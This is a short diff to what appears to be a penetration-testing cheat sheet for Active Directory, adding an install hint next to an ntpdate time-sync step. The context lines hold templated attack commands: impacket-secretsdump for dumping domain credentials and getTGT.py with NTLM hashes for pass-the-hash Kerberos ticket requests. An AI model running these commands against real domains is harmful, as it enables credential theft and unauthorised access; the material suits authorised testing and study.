@@ -525,7 +525,7 @@ impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <domain control
 # If in VirtualBox, disabling time synchronization between the virtual machine and the host.
 sudo service virtualbox-guest-utils stop
 # synchronize with server time
-sudo ntpdate <target ip>
+sudo ntpdate <target ip> # sudo apt-get -y install ntpdate
 #
 getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<username>
 # Kerberos credentials cache
